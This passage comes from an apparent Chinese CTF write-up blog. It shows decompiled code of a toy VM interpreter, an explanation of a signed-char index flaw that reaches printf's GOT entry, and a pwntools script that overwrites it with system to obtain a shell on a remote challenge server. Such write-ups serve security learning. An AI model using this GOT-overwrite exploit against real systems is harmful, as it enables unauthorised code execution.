class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        v3 = *(<span class="type">char</span> *)(++i + a2);</span><br><span class="line">        *(_BYTE *)(a1 + v3) = sub_1254(a1);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">        sub_11E6(a1, *(<span class="type">unsigned</span> __int8 *)(a1 + *(<span class="type">char</span> *)(++i + a2)));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) &lt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Stack underflow!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ++*(_BYTE *)(a1 + *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) + <span class="number">128</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) &lt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Stack underflow!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        --*(_BYTE *)(a1 + *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) + <span class="number">128</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">9u</span>:</span><br><span class="line">        v11 = sub_1254(a1);</span><br><span class="line">        v10 = sub_1254(a1);</span><br><span class="line">        sub_11E6(a1, (<span class="type">unsigned</span> __int8)(v10 * v11));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xAu</span>:</span><br><span class="line">        v13 = sub_1254(a1);</span><br><span class="line">        v12 = sub_1254(a1);</span><br><span class="line">        <span class="keyword">if</span> ( !v12 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Division by zero!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        sub_11E6(a1, (<span class="type">unsigned</span> __int8)(v13 / v12));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xBu</span>:</span><br><span class="line">        v15 = sub_1254(a1);</span><br><span class="line">        v14 = sub_1254(a1);</span><br><span class="line">        <span class="keyword">if</span> ( !v14 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Division by zero!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        sub_11E6(a1, (<span class="type">unsigned</span> __int8)(v15 % v14));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xCu</span>:</span><br><span class="line">        v17 = sub_1254(a1);</span><br><span class="line">        v16 = sub_1254(a1);</span><br><span class="line">        sub_11E6(a1, (<span class="type">unsigned</span> __int8)(v16 &amp; v17));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xDu</span>:</span><br><span class="line">        v19 = sub_1254(a1);</span><br><span class="line">        v18 = sub_1254(a1);</span><br><span class="line">        sub_11E6(a1, (<span class="type">unsigned</span> __int8)(v18 | v19));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xEu</span>:</span><br><span class="line">        v21 = sub_1254(a1);</span><br><span class="line">        v20 = sub_1254(a1);</span><br><span class="line">        sub_11E6(a1, (<span class="type">unsigned</span> __int8)(v20 ^ v21));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xFu</span>:</span><br><span class="line">        <span class="keyword">if</span> ( *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) &lt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Stack underflow!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_BYTE *)(a1 + *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) + <span class="number">128</span>) = ~*(_BYTE *)(a1 + *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) + <span class="number">128</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x10u</span>:</span><br><span class="line">        v22 = *(_BYTE *)(i + <span class="number">1</span> + a2);</span><br><span class="line">        <span class="keyword">if</span> ( a3 &lt;= v22 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Jump out of bounds!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        i = v22 - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x11u</span>:</span><br><span class="line">        v23 = *(_BYTE *)(++i + a2);</span><br><span class="line">        <span class="keyword">if</span> ( a3 &lt;= v23 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Jump out of bounds!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) &gt;= <span class="number">0</span> &amp;&amp; !*(_BYTE *)(a1 + *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) + <span class="number">128</span>) )</span><br><span class="line">          i = v23 - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x12u</span>:</span><br><span class="line">        v24 = *(_BYTE *)(++i + a2);</span><br><span class="line">        <span class="keyword">if</span> ( a3 &lt;= v24 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Jump out of bounds!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) &gt;= <span class="number">0</span> &amp;&amp; *(_BYTE *)(a1 + *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) + <span class="number">128</span>) )</span><br><span class="line">          i = v24 - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Unknown opcode: 0x%02X\n&quot;</span>, v25);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过逆向，主要有用的命令码有：0x01将下一个字节压栈；0x03：加法（弹出栈顶两元素相加后压栈）；0x04：减法（弹出栈顶元素减次栈顶元素后压栈）；0x05：将栈顶值存到下一字节索引处<br>选项0x05中的索引值类型为char，如果我们写入0x80，即128超出char的上限，0x80&#x3D;0b10000000，符号位是1被认定为负数的补码，还原后会得到-128，即-0x80，这时我们在ida里发现索引到-128处正好是printf的got表项，那么我们根据偏移关系（libc.sym[“system”]和libc.sym[“printf”]比对），就可以把printf的got表项改为system，最后把”sh”写入（一般写&#x2F;bin&#x2F;sh，这里图省事），便可以getshell。<br>wp<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">log.success(<span class="built_in">hex</span>(libc.sym[<span class="string">&quot;system&quot;</span>]-libc.sym[<span class="string">&quot;printf&quot;</span>]))</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;125.220.147.47&#x27;</span>,<span class="number">49761</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;\x01&quot;</span>+p8(<span class="number">0x70</span>)+<span class="string">b&quot;\x05&quot;</span>+p8(<span class="number">0x80</span>)</span><br><span class="line">payload+=<span class="string">b&quot;\x01\x07\x06\x81\x03&quot;</span>+<span class="string">b&quot;\x05&quot;</span>+p8(<span class="number">0x81</span>)</span><br><span class="line">payload+=<span class="string">b&quot;\x01\x01\x06\x82\x04&quot;</span>+<span class="string">b&quot;\x05&quot;</span>+p8(<span class="number">0x82</span>)</span><br><span class="line">payload+=<span class="string">b&quot;\x01s&quot;</span>+ <span class="string">b&quot;\x05&quot;</span>+p8(<span class="number">0x0</span>)+ <span class="string">b&quot;\x01h&quot;</span>+ <span class="string">b&quot;\x05&quot;</span>+p8(<span class="number">0x1</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;input length: &quot;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(payload)).encode())</span><br><span class="line">r.sendafter(<span class="string">b&quot;input code: &quot;</span>, payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> stack </category>
          
          <category> ROP </category>
          
          <category> ret2libc </category>
          
          <category> vm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复盘 </tag>
            
            <tag> 复现 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
